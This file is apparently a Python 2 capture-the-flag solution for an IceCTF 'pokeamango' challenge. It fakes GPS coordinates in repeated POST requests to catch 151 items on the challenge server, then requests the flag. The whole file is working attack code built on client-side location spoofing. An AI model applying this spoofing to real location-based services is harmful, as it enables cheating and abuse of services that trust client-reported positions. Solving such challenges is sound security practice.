import requests
import time
import random
import ast 
import uuid
xuuid= "2a05d90d-8c1a-4545-8fc0-1a22d6a33b15"

fcity = open('cities.txt', 'r')
cities = fcity.read().splitlines()
fcity.close()
		
def getcurrpos():
	global curr_city
	data = cities[curr_city].split('\t')
	return (data[2], data[1])
	
def getmangos():
	global cookies
	global currpos
	r = requests.post("http://pokeamango.vuln.icec.tf/mango/list", data={"uuid":xuuid,"lat":currpos[0],"long":currpos[1]}, cookies=cookies)
	print r.text
	if r.text[0] != "<":
		res = ast.literal_eval(r.text)
		if res['mangos'] != None:
			time.sleep(5)
			return res['mangos']
	time.sleep(5)
	return getmangos()
	
curr_city = 0		
mangos_count = 0
currpos = getcurrpos()
cookies = {}
print currpos
while mangos_count < 151:
	mangos = getmangos()
	currpos = getcurrpos()
	for i in xrange(len(mangos)):
		mangoLat = str(mangos[i]["lat"])
		mangoLong = str(mangos[i]["lng"])
		myLat = mangoLat[:mangoLat.find('.')+5]
		myLng = mangoLong[:mangoLong.find('.')+5]
		r = requests.post("http://pokeamango.vuln.icec.tf/mango/catch", data={"uuid":xuuid,
			"curLat":float(myLat),"curLong":float(myLng),
			"mangoLat":float(mangoLat), "mangoLong":float(mangoLong)}, cookies =cookies)
		print r.text
		time.sleep(5)
	curr_city +=1
	r = requests.post("http://pokeamango.vuln.icec.tf/mango/count", data={"uuid":xuuid	})
	print r.text
	if r.text[0] != "<":
		res = ast.literal_eval(r.text)
		mangos_count = int(res["count"])
		print 'Count %d' % mangos_count	
		
while True:
	r = requests.post("http://pokeamango.vuln.icec.tf/store/flag", data={"uuid":xuuid}, cookies=cookies)
	print r.text
	if r.text[0] != "<":
		break
	time.sleep(5)
	
